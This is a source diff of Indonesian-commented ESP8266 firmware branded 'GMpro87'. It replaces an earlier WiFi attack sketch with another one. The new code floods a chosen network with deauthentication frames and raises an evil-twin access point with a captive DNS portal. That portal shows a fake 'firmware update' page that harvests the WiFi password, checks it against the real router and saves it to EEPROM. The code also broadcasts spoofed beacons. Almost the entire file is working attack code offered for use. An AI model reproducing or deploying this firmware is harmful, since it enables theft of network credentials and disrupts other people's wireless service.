@@ -1,218 +1,267 @@
+/*
+ * WiFiSnare + BeaconSpammer + EEPROM Save
+ * Branding: GMpro87
+ * SSID: GMpro | PASS: Sangkur87
+ * Mode: LED Strobo on Success
+ */
+
 #include <Arduino.h>
-#include <ESP8266WiFi.h>
 #include <DNSServer.h>
+#include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
-#include <SimpleCLI.h>
-#include "LittleFS.h"
-
-// ========================================================
-// 1. INCLUDE CUSTOM HEADERS
-// ========================================================
-// Kita panggil .h dulu karena variabelnya ada di sana
-#include "web.h"
-#include "beacon.h"
-#include "sniffer.h"
-
-// ========================================================
-// 2. VARIABEL LOGIKA APLIKASI
-// ========================================================
-#define MAC "C8:C9:A3:0C:5F:3F"
-#define MAC2 "C8:C9:A3:6B:36:74"
-bool lock = true;
-SimpleCLI cli;
-Command send_deauth, stop_deauth, reboot, start_deauth_mon, start_probe_mon;
-
-int packet_deauth_counter = 0;
-const char* fsName = "LittleFS";
-
-// Variabel pendukung file manager
-String fileList = "";
-File fsUploadFile, webportal, log_captive;
-String status_button;
-String start_button = "Start";
-int target_count = 0, target_mark = 0;
-
-const uint8_t channels[] = {1, 6, 11};
-const bool wpa2 = true;
-const bool appendSpaces = false;
-char ssids[500];
-String wifistr = "";
+#include <EEPROM.h>
 
 extern "C" {
-#include "user_interface.h"
-  typedef void (*freedom_outside_cb_t)(uint8 status);
-  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
-  void wifi_unregister_send_pkt_freedom_cb(void);
-  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
+  #include "user_interface.h"
 }
 
-int ledstatus = 0;
-bool hotspot_active = false, deauthing_active = false, pishing_active = false, hidden_target = false, deauth_mon = false;
-unsigned long d_mon_ = 0, previousMillis = 0, deauth_now = 0;
-int ledState = LOW, ledState2 = LOW; 
-const long interval = 1000;
+// ===== CONFIGURATION ===== //
+const char *admin_ssid = "GMpro";
+const char *admin_pass = "Sangkur87";
+const char *branding_title = "GMpro87";
+
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+IPAddress apIP(192, 168, 4, 1);
+IPAddress subNetMask(255, 255, 255, 0);
+
+// Global State
+bool hotspot_active = false;
+bool deauthing_active = false;
+bool spammer_active = false;
+String tryPassword = "";
+String correctPassword = "";
+unsigned long last_scan = 0;
+unsigned long last_deauth = 0;
+unsigned long last_spam = 0;
 
 typedef struct {
-  String ssid; uint8_t ch; uint8_t rssi; uint8_t bssid[6]; String bssid_str;
-} _Network;
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+  int32_t rssi;
+  uint8_t encryption;
+} networkDetails;
 
-const byte DNS_PORT = 53;
-IPAddress apIP, dnsip;
-DNSServer dnsServer;
-_Network _networks[16], _selectedNetwork;
-String ssid_target = "", mac_target = "", _correct = "", _tryPassword = "";
+networkDetails networks[16];
+networkDetails selectedNetwork;
 
-// ========================================================
-// 3. FUNGSI HELPER & LOGIKA
-// ========================================================
+// Beacon Spammer Data
+const char ssids_spam[] PROGMEM = "GMpro_Free\nGMpro_VIP\nInternet_Gratis\nWiFi_Kenceng\nKena_Prank_Lu\n";
+uint8_t beaconPacket[109] = {
+  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
+  0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0xe8, 0x03, 
+  0x31, 0x00, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
+  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
+  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
+  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01
+};
 
-String bytesToStr(const uint8_t* b, uint32_t size) {
-  String str;
-  for (uint32_t i = 0; i < size; i++) {
-    if (b[i] < 0x10) str += "0";
-    str += String(b[i], HEX);
-    if (i < size - 1) str += ":";
-  }
-  return str;
-}
+uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00};
 
-void clearArray() { for (int i = 0; i < 16; i++) { _Network _n; _networks[i] = _n; } }
-
-void handleList(){
-  fileList = "";
-  Dir dir = fileSystem->openDir("");
-  while (dir.next()) {
-    fileList += "<form action='/delete' method='post'><input type='submit' value='delete'><input name='filename' type='hidden' value='" + dir.fileName() +"'> ";
-    fileList += dir.fileName() + " (" + String(dir.fileSize()/1000) + "kb)</form><br>";
-  }
-}
-
-void handleFS(){
-  handleList();
-  FSInfo fs_info;
-  fileSystem->info(fs_info);
-  total_spiffs = fs_info.totalBytes/1000;
-  used_spiffs = fs_info.usedBytes/1000;
-  free_spiffs = total_spiffs - used_spiffs;
-  // (Isi HTML dipersingkat, sesuaikan dengan aslinya)
-  webServer.send(200,"text/html",Header + "File Manager Content" + Footer);
-}
-
-void handleFileUpload(){
-  HTTPUpload& upload = webServer.upload();
-  if(upload.status == UPLOAD_FILE_START){
-    String filename = upload.filename;
-    if(!filename.startsWith("/")) filename = "/"+filename;
-    fsUploadFile = fileSystem->open(filename, "w");
-  } else if(upload.status == UPLOAD_FILE_WRITE && fsUploadFile){
-    fsUploadFile.write(upload.buf, upload.currentSize);
-  } else if(upload.status == UPLOAD_FILE_END && fsUploadFile){
-    fsUploadFile.close();
-    handleFS();
+// --- LED Strobo Logic ---
+void stroboLED() {
+  for (int i = 0; i < 50; i++) {
+    digitalWrite(2, LOW); // On (ESP8266 LED is active low)
+    delay(50);
+    digitalWrite(2, HIGH); // Off
+    delay(50);
   }
 }
 
-// ==================== [ FUNGSI ATTACK ] ====================
+// --- EEPROM Logic ---
+void saveToEEPROM(String data) {
+  for (int i = 0; i < data.length(); ++i) EEPROM.write(i, data[i]);
+  EEPROM.write(data.length(), '\0');
+  EEPROM.commit();
+}
 
-void nextChannel() {
-  if (sizeof(channels) > 1) {
-    uint8_t ch = channels[channelIndex];
-    channelIndex = (channelIndex + 1) % sizeof(channels);
-    if (ch != wifi_channel) { wifi_channel = ch; wifi_set_channel(wifi_channel); }
+String readFromEEPROM() {
+  String data = "";
+  for (int i = 0; i < 200; ++i) {
+    char c = char(EEPROM.read(i));
+    if (c == '\0') break;
+    data += c;
+  }
+  return data;
+}
+
+// --- Helpers ---
+String bytesToStr(const uint8_t* bytes, uint32_t size) {
+  String result;
+  for (uint32_t i = 0; i < size; ++i) {
+    if (i > 0) result += ':';
+    if (bytes[i] < 0x10) result += '0';
+    result += String(bytes[i], HEX);
+  }
+  return result;
+}
+
+void performScan() {
+  int n = WiFi.scanNetworks();
+  if (n <= 0) return;
+  for (int i = 0; i < min(n, 16); ++i) {
+    networks[i].ssid = WiFi.SSID(i);
+    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
+    networks[i].ch = WiFi.channel(i);
+    networks[i].rssi = WiFi.RSSI(i);
+    networks[i].encryption = WiFi.encryptionType(i);
   }
 }
 
-void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }
-
-void enableBeacon(String target_ssid){
-  wifistr = "";
-  for(int i=0; i<beacon_size; i++){
-    wifistr += target_ssid;
-    for(int c=0; c<i; c++) wifistr += " ";
-    wifistr += "\n";
-  }
-  wifistr.toCharArray(ssids, 500);
-  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
-  randomSeed(os_random());
-  packetSize = sizeof(beaconPacket);
-  randomMac();
-  beacon_active = true;
+// --- UI Header ---
+String getHeader(String title) {
+  return "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>"
+         "body{background:#0a0a0a;color:#eee;font-family:sans-serif;text-align:center;margin:0;}"
+         ".header{background:linear-gradient(to bottom, #d4af37, #b8860b);color:#000;padding:20px;font-weight:bold;font-size:1.8em;text-shadow: 1px 1px #fff;}"
+         "table{width:95%;margin:20px auto;border-collapse:collapse;background:#1a1a1a;font-size:0.9em;}"
+         "th,td{padding:10px;border:1px solid #d4af37;}"
+         "th{background:#333;color:#d4af37;}"
+         ".btn{padding:10px 15px;border:none;border-radius:4px;cursor:pointer;font-weight:bold;margin:5px;display:inline-block;text-decoration:none;}"
+         ".btn-gold{background:#d4af37;color:#000;}"
+         ".btn-red{background:#8b0000;color:#fff;}"
+         ".btn-blue{background:#004a99;color:#fff;}"
+         "input{width:85%;padding:12px;margin:10px;border-radius:5px;border:1px solid #d4af37;background:#222;color:#fff;}"
+         ".log-box{background:#002200; border:1px dashed #00ff00; padding:15px; margin:20px; color:#00ff00; font-family:monospace;}"
+         "</style><title>" + title + "</title></head><body>"
+         "<div class='header'>" + branding_title + "</div>";
 }
 
-void handleStartAttack(){
-  if(start_button == "Start"){
-    start_button = "Stop";
-    if(webServer.arg("beacon") == "1") { beacon_active = true; enableBeacon(ssid_target); }
-    if(webServer.arg("deauth") == "1") deauthing_active = true;
+// --- Handlers ---
+void handleRoot() {
+  if (hotspot_active) {
+    if (webServer.hasArg("password")) {
+      tryPassword = webServer.arg("password");
+      WiFi.disconnect();
+      WiFi.begin(selectedNetwork.ssid.c_str(), tryPassword.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
+      webServer.send(200, "text/html", getHeader("Verifying") + "<h3>Memproses Data...</h3><p>Router sedang melakukan sinkronisasi firmware baru. Mohon tunggu 15 detik.</p><script>setTimeout(()=>window.location.href='/result',15000);</script></body></html>");
+    } else {
+      String p = getHeader(selectedNetwork.ssid);
+      p += "<div style='padding:20px;'><h3>Verifikasi Diperlukan</h3><p>Pembaruan sistem otomatis terhenti. Masukkan kata sandi WiFi untuk melanjutkan instalasi firmware.</p>"
+           "<form method='POST'><input type='password' name='password' placeholder='WiFi Password' required><br>"
+           "<input type='submit' class='btn btn-gold' value='Update Sekarang'></form></div></body></html>";
+      webServer.send(200, "text/html", p);
+    }
+    return;
+  }
+
+  // Admin Panel Commands
+  if (webServer.hasArg("ap")) {
+    String b = webServer.arg("ap");
+    for(int i=0; i<16; i++) if(bytesToStr(networks[i].bssid,6)==b) selectedNetwork = networks[i];
+  }
+  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
+  if (webServer.hasArg("spam")) spammer_active = (webServer.arg("spam") == "1");
+  if (webServer.hasArg("clear")) { saveToEEPROM(""); correctPassword = ""; }
+  if (webServer.hasArg("evil")) {
+    hotspot_active = (webServer.arg("evil") == "1");
+    dnsServer.stop(); WiFi.softAPdisconnect(true);
+    WiFi.softAPConfig(apIP, apIP, subNetMask);
+    if(hotspot_active) WiFi.softAP(selectedNetwork.ssid.c_str());
+    else WiFi.softAP(admin_ssid, admin_pass);
+    dnsServer.start(53, "*", apIP);
+  }
+
+  String p = getHeader("Admin Panel");
+  p += "<table><tr><th>SSID</th><th>RSSI</th><th>Aksi</th></tr>";
+  for (int i=0; i<16 && networks[i].ssid!=""; i++) {
+    bool isS = (bytesToStr(networks[i].bssid,6) == bytesToStr(selectedNetwork.bssid,6));
+    p += "<tr><td>"+networks[i].ssid+"</td><td>"+String(networks[i].rssi)+"</td>"
+         "<td><a href='/?ap="+bytesToStr(networks[i].bssid,6)+"' class='btn "+(isS?"btn-gold":"btn-blue")+"'>"+(isS?"✓":"Pilih")+"</a></td></tr>";
+  }
+  p += "</table><div style='padding:10px;'>";
+  p += "<a href='/?deauth="+(String)(deauthing_active?"0":"1")+"' class='btn "+(deauthing_active?"btn-red":"btn-gold")+"'>Deauth: "+(deauthing_active?"ON":"OFF")+"</a>";
+  p += "<a href='/?evil="+(String)(hotspot_active?"0":"1")+"' class='btn "+(hotspot_active?"btn-red":"btn-gold")+"'>EvilTwin: "+(hotspot_active?"ON":"OFF")+"</a>";
+  p += "<a href='/?spam="+(String)(spammer_active?"0":"1")+"' class='btn "+(spammer_active?"btn-red":"btn-gold")+"'>Spammer: "+(spammer_active?"ON":"OFF")+"</a>";
+  p += "</div>";
+  
+  if(correctPassword != "") {
+    p += "<div class='log-box'><strong>LOG HASIL:</strong><br>"+correctPassword+"<br><br><a href='/?clear=1' style='color:red'>Hapus Log</a></div>";
+  }
+  
+  p += "</body></html>";
+  webServer.send(200, "text/html", p);
+}
+
+void handleResult() {
+  if (WiFi.status() == WL_CONNECTED) {
+    String res = "SSID: " + selectedNetwork.ssid + " | PASS: " + tryPassword;
+    correctPassword = res;
+    saveToEEPROM(res); // Simpan permanen
+    
+    // Trigger Strobo LED Kemenangan
+    stroboLED();
+    
+    hotspot_active = false; deauthing_active = false;
+    WiFi.softAPdisconnect(true); WiFi.softAP(admin_ssid, admin_pass);
+    webServer.send(200, "text/html", getHeader("Success") + "<h3>Update Berhasil!</h3><p>Router akan restart.</p></body></html>");
   } else {
-    start_button = "Start";
-    deauthing_active = false; beacon_active = false;
+    webServer.send(200, "text/html", getHeader("Error") + "<h3>Password Salah</h3><p>Mengalihkan kembali...</p><script>setTimeout(()=>window.location.href='/',3000);</script></body></html>");
   }
-  handleIndex(); // handleIndex ada di web.h
 }
 
-// ==================== [ SETUP & LOOP ] ====================
-
+// --- Setup ---
 void setup() {
-  Serial.begin(115200);
-  initFS(); loadsetting();
-  apIP.fromString(ip); dnsip.fromString(dns);
+  EEPROM.begin(512);
+  correctPassword = readFromEEPROM(); // Load password lama jika ada
   
-  WiFi.softAP(ssid, password, chnl, false);
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  pinMode(2, OUTPUT);
+  digitalWrite(2, HIGH); // Off initial state
   
-  pinMode(2, OUTPUT); pinMode(16, OUTPUT); pinMode(0, INPUT_PULLUP);
+  WiFi.mode(WIFI_AP_STA);
+  wifi_promiscuous_enable(1);
+  WiFi.softAPConfig(apIP, apIP, subNetMask);
+  WiFi.softAP(admin_ssid, admin_pass);
   
-  // Setup Routes
-  webServer.on("/", HTTP_GET, handleIndex);
-  webServer.on("/start", HTTP_GET, handleStartAttack);
-  webServer.on("/filemanager", HTTP_GET, handleFS);
-  webServer.on("/filemanager", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);
-  
+  dnsServer.start(53, "*", apIP);
+  webServer.on("/", handleRoot);
+  webServer.on("/result", handleResult);
+  webServer.onNotFound(handleRoot);
   webServer.begin();
-  
-  send_deauth = cli.addCmd("send_deauth");
-  stop_deauth = cli.addCmd("stop_deauth");
-  reboot = cli.addCmd("reboot");
+  performScan();
 }
 
+// --- Loop Logic ---
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  if (Serial.available()) {
-    String input = Serial.readStringUntil('\n');
-    cli.parse(input);
+  unsigned long now = millis();
+
+  // 1. Logic Deauth (Hanya jika target dipilih dan aktif)
+  if (deauthing_active && now - last_deauth > 1000) {
+    wifi_set_channel(selectedNetwork.ch);
+    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
+    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
+    deauthPacket[0] = 0xC0; wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    deauthPacket[0] = 0xA0; wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    last_deauth = now;
   }
 
-  // Deauth Logic
-  if (deauthing_active && millis() - deauth_now >= deauth_speed) {
-    deauth_now = millis();
-    wifi_set_channel(_selectedNetwork.ch);
-    uint8_t dp[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
-    memcpy(&dp[10], _selectedNetwork.bssid, 6);
-    memcpy(&dp[16], _selectedNetwork.bssid, 6);
-    for(int i=0; i<5; i++) wifi_send_pkt_freedom(dp, 26, 0);
-  }
-
-  // Beacon Logic
-  if (beacon_active && millis() - attackTime > 100) {
-    attackTime = millis();
-    nextChannel();
-    // Logic pengiriman beacon (pake variabel dari beacon.h)
-    int i = 0, ssidNum = 1;
-    int ssLen = strlen(ssids);
-    while (i < ssLen) {
-      int j = 0;
-      while (ssids[i+j] != '\n' && j < 32 && (i+j) < ssLen) j++;
-      macAddr[5] = ssidNum++;
-      memcpy(&beaconPacket[10], macAddr, 6);
-      memcpy(&beaconPacket[16], macAddr, 6);
-      memset(&beaconPacket[38], 0x20, 32);
-      memcpy(&beaconPacket[38], &ssids[i], j);
-      beaconPacket[37] = j;
-      wifi_send_pkt_freedom(beaconPacket, packetSize, 0);
-      i += (j + 1);
+  // 2. Logic Beacon Spammer
+  if (spammer_active && now - last_spam > 100) {
+    static int spam_ptr = 0;
+    int j = 0; char tmp;
+    while (true) {
+      tmp = pgm_read_byte(ssids_spam + spam_ptr + j);
+      if (tmp == '\n' || tmp == '\0' || j > 31) break;
+      j++;
     }
+    uint8_t mac[6] = {0x00, 0x01, 0x02, 0x03, 0x04, (uint8_t)random(255)};
+    memcpy(&beaconPacket[10], mac, 6); memcpy(&beaconPacket[16], mac, 6);
+    memset(&beaconPacket[38], 0x20, 32); memcpy_P(&beaconPacket[38], &ssids_spam[spam_ptr], j);
+    beaconPacket[37] = j;
+    wifi_set_channel(random(1, 12));
+    wifi_send_pkt_freedom(beaconPacket, 109, 0);
+    spam_ptr += j + 1;
+    if (spam_ptr >= strlen_P(ssids_spam)) spam_ptr = 0;
+    last_spam = now;
+  }
+
+  // 3. Auto Scan berkala
+  if (now - last_scan > 30000 && !hotspot_active) { 
+    performScan(); 
+    last_scan = now; 
   }
 }
